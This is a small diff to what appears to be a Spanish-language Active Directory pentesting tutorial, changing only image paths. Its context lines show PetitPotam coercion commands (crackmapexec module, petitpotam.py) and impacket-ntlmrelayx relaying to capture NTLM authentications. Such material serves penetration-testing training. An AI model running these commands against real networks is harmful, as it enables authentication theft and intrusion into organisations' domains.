@@ -10,7 +10,7 @@ poetry run crackmapexec smb <Rango IP> -M petitpotam
 python petitpotam.py <IP atacante> <DNS del equipo vísctima>
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/uno_credentials/petitpotam/petitpotam1.png?raw=true "petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam1.png?raw=true "petitpotam")
 
 ```Bash
 # Obtener dispositivos con el SMB sin firmar
@@ -20,5 +20,5 @@ impacket-ntlmrelayx -tf <output equipos relay> -of netntlm -smb2support -socks
 # Insertar el comando "socks" en la misma terminal para obtener las autenticaciones capturadas
 ```
 
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/uno_credentials/petitpotam/petitpotam2.png?raw=true "NTLM relay petitpotam")
-![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/uno_credentials/petitpotam/petitpotam3.png?raw=true "NTLM relay petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam2.png?raw=true "NTLM relay petitpotam")
+![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/no_credentials/petitpotam/petitpotam3.png?raw=true "NTLM relay petitpotam")
